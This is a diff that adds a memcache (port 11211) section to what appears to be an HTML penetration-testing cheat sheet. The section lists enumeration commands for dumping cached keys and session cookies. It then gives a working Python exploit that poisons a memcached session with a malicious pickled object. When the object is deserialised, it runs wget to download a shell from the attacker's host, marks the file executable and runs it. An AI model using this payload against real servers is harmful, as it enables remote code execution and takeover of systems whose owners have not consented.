@@ -2162,6 +2162,58 @@
     </tr>
 </table>
 
+<h2>11211 TCP / memcache</h2>
+<li>Tools</li>
+<ul>
+    <li>nc</li>
+    <li>telnet</li>
+</ul>
+<li>memcache commands</li>
+<table>
+    <tr>
+        <td>Retrieve cached items list</td>
+        <td>stats items</td>
+    </tr>
+    <tr>
+        <td>
+            <li>View cachedump of key retrieved from "stats items"</li>
+            <ul>
+                <li>STAT items:&lt;#&gt;:age 75, etc</li>
+                <li>0 at the end for dumping unlimited lines</li>
+            </ul>
+        </td>
+        <td>stats cachedump &lt;#&gt; 0</td>
+    </tr>
+</table>
+
+<li>RCE -python pickling</li>
+<ul>
+    <li>pip install pymemcache</li>
+    <li>Generate malicious pickled python object to poison memcached object</li>
+    <ul>
+        <li>Script:</li>
+<pre>
+import pickle
+import os
+import sys
+from pymemcache.client import base
+class RCE:
+    def __reduce__(self):
+        cmd = ('wget http://{}:5000/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell'.format(sys.argv[1]))
+        return os.system, (cmd,)
+if __name__ == '__main__':
+    client = base.Client((sys.argv[2], 11211))
+    client.set(sys.argv[3], pickle.dumps(RCE()))
+</pre>
+    </ul>
+    <li>python exploit.py &lt;attacker ip&gt; &lt;memcache server ip&gt; &lt;session:&lt;value&gt;&gt;</li>
+    <ul>
+        <li>&lt;session:&lt;value&gt;&gt; comes from authenticated session cookie dumped from memcache server</li>
+        <ul>
+            <li>This cookie can also stored in browser storage</li>
+        </ul>
+    </ul>
+</ul>
 
 </body>
 </html>
